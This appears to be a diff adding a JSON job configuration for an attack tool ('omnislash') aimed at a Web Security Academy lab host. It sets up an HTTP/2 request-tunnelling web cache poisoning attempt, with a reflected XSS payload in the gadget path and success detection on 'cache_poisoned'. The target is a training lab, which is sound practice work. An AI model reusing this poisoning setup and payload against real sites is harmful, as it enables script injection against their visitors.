@@ -1,0 +1,31 @@
+{
+  "omnislash_config": "config.cache-tunnel.json",
+  "proxies": "",
+  "log_file": "lab-cache-tunnel.jsonl",
+  "poll_interval": "1s",
+  "concurrency": 1,
+  "exit_on_success": true,
+  "control_addr": "127.0.0.1:7778",
+  "jobs": [
+    {
+      "name": "lab-h2-cache-tunnel",
+      "target": {
+        "addr": "0acc0008048896918251426b001f00a0.web-security-academy.net:443",
+        "host": "0acc0008048896918251426b001f00a0.web-security-academy.net",
+        "path": "/"
+      },
+      "tls": "h2",
+      "probe": "h2-tunnel",
+      "poison_path": "/",
+      "gadget_path": "/resources?<script>alert(1)</script>",
+      "success_contains": "<script>alert(1)</script>",
+      "success_finding": "cache_poisoned",
+      "attempts": 2,
+      "until_success": true,
+      "interval": "5s",
+      "timeout": "15s",
+      "idle": "4s",
+      "retry_delay": "500ms"
+    }
+  ]
+}
